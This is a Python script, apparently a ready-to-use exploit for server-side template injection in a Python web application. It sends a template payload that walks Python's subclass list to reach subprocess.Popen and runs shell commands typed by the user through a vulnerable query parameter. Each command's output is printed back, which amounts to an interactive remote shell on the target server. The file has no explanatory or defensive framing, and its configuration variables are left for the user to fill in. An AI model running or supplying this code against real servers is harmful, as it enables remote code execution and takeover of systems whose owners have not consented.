import requests

FUNCTION_INDEX = 304  # Put subprocess.popen() index
TARGET_IP = "127.0.0.1"  # Put target ip
TARGET_PORT = 8080  # Put target port
TARGET_PATH = "/welcome"  # Put target path
PAYLOAD_KEY = "name"  # The key of the payload ( Vulnerable parameter )

while True:
    command = input(">> ")
    payload = "{{" + \
        f""" "".__class__.__base__.__subclasses__()[{FUNCTION_INDEX}]("{command}",shell=True,stdout=-1).communicate() """ + "}}"
    r = requests.get(
        f"http://{TARGET_IP}:{TARGET_PORT}{TARGET_PATH}", {PAYLOAD_KEY: payload})
    print(str(' '.join(r.text.split(" ")[2:-12]).replace("\\r\\n", "\n")))
